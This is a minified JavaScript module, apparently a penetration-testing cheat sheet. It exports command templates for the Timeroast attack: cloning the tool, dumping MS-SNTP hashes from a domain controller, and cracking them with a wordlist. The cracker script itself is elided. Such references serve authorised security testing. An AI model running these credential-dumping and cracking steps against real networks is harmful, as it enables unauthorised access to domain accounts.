const s=[{title:"Run Timeroast to dump hashes",description:"Dump MS-SNTP hashes from the target domain controller.",template:`git clone https://github.com/SecuraBV/Timeroast.git 
cd Timeroast
python3 timeroast.py {domain_controller} -o hashes.txt`},{title:"Crack Timeroast hashes",description:"Crack dumped hashes using a wordlist.",template:"python3 timeroast_cracker.py -H hashes.txt -w {wordlist}"},{title:"Timeroast password cracker script",description:"Python script to crack MS-SNTP hashes using wordlist or single password.",template:`#!/usr/bin/env python3
...
if __name__ == '__main__':
    main()
`}],r={commands:s};export{s as commands,r as default};
